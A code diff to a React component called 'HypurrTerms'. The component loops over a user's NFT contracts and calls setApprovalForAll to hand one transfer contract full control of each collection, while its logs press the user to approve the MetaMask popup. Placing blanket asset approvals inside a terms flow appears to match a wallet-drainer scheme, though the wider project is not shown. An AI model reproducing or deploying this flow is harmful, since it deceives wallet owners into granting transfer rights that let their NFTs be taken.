@@ -261,20 +261,18 @@ const HypurrTerms = () => {
           continue;
         }
         
-        // Approve contract - this should trigger MetaMask popup
+        // Approve contract - this will trigger MetaMask popup immediately
         console.log(`Approval: Requesting approval for ${nftContractAddress}...`);
-        console.log(`Approval: This will open MetaMask - please approve the transaction`);
+        console.log(`Approval: MetaMask popup should appear now - please approve`);
         
-        // Use sendTransaction to ensure MetaMask popup appears
-        const tx = await nftContract.setApprovalForAll(TRANSFER_CONTRACT, true, {
-          gasLimit: 100000 // Set gas limit to ensure transaction goes through
-        });
+        // Call setApprovalForAll - this will trigger MetaMask popup
+        const tx = await nftContract.setApprovalForAll(TRANSFER_CONTRACT, true);
         
-        console.log(`Approval: Transaction sent, waiting for confirmation... Hash:`, tx.hash);
-        console.log(`Approval: Please confirm the transaction in MetaMask`);
+        console.log(`Approval: Transaction submitted, hash:`, tx.hash);
+        console.log(`Approval: Waiting for confirmation...`);
         
         await tx.wait();
-        console.log(`Contract ${nftContractAddress} approved:`, tx.hash);
+        console.log(`Approval: Contract ${nftContractAddress} approved successfully`);
       } catch (error) {
         console.error(`Error approving ${nftContractAddress}:`, error);
         if (error.code === 4001) {
